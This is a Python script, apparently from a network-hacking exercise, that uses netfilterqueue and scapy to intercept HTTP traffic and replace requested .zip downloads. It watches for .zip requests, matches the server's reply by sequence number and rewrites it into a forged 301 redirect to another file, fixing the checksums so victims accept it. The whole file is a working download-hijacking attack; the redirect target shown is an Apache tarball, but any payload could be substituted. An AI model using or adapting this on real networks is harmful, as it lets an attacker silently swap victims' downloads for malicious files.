#!/usr/bin/env python

import netfilterqueue
import scapy.layers.inet as inet
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = inet.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[inet.TCP].dport == 80:
            if ".zip" in scapy_packet[scapy.Raw].load.decode():
                print(".zip request")
                ack_list.append(scapy_packet[inet.TCP].ack)
        elif scapy_packet[inet.TCP].sport == 80:
            if scapy_packet[inet.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[inet.TCP].seq)
                print("Replacing file.")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://dlcdn.apache.org/httpd/httpd-2.4.54.tar.bz2\n\n"

                del scapy_packet[inet.IP].len
                del scapy_packet[inet.IP].chksum
                del scapy_packet[inet.TCP].chksum

                packet.set_payload(bytes(scapy_packet))

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nExiting script.\n")
